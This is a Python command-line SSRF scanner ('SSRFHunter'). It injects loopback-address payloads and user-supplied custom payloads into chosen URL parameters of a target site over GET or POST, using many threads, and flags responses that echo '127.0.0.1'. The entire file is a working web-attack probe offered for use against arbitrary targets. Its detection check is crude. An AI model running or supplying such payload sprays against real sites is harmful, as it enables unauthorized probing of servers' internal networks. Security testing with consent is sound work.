#!/usr/bin/env python3

import argparse
import concurrent.futures
import logging
import requests
import os 
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_ssrf(target_url, param, payload, method):
    """Tests a single payload on a single parameter"""

    test_url = target_url
    if method == 'GET':
        test_url += '?' + param + '=' + payload
        r = requests.get(test_url)
    elif method == 'POST':
        data = {param: payload}
        r = requests.post(test_url, data=data)

    # look for common signs of SSRF vulnerability
    if r.status_code == 200 and "127.0.0.1" in r.text:
        logging.warning('Potential SSRF vulnerability found on parameter: %s', param)
        logging.warning('Payload tested: %s', payload)
        logging.warning('Response code: %s', r.status_code)
        logging.warning('Full URL: %s', test_url)
        print("\n")
        # logging.warning('Response body: %s', r.text)

def main():
    """Main function"""

    parser = argparse.ArgumentParser(description='Test a URL for SSRF vulnerabilities')
    parser.add_argument('-u', '--url', dest='url', help='The URL to be tested', required=True)
    parser.add_argument('-p', '--params', dest='params', help='Comma-separated list of parameters to test', default='url,dest_url,site_url,page_url')
    parser.add_argument('-m', '--method', dest='method', help='The HTTP method to use for testing (GET or POST)', default='GET')
    parser.add_argument('-t', '--threads', dest='threads', help='Number of threads to use for testing', type=int, default=10)
    parser.add_argument('-c', '--custom-payloads', dest='custom_payloads', help='Path to a file containing custom payloads', default=None)
    args = parser.parse_args()

    # display a banner
    os.system("figlet SSRFHunter | lolcat")

    # validate the input arguments
    if args.method not in ['GET', 'POST']:
        logging.error('Invalid HTTP method specified')
        sys.exit(1)

    # parse the parameters to test
    params_to_test = args.params.split(',')

    # define the SSRF payloads to test
    ssrf_payloads = [
        'http://localhost/',
        'http://127.0.0.1/',
        'http://[::1]/',
        'http://0.0.0.0/',
        'http://127.127.127.127/',
    ]

    # add custom payloads if provided
    if args.custom_payloads is not None:
        with open(args.custom_payloads, 'r') as f:
            custom_payloads = f.read().splitlines()
            ssrf_payloads.extend(custom_payloads)

    # test each parameter with each payload
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for param in params_to_test:
            for payload in ssrf_payloads:
                futures.append(executor.submit(test_ssrf, args.url, param, payload, args.method))
        concurrent.futures.wait(futures)

if __name__ == '__main__':
    main()
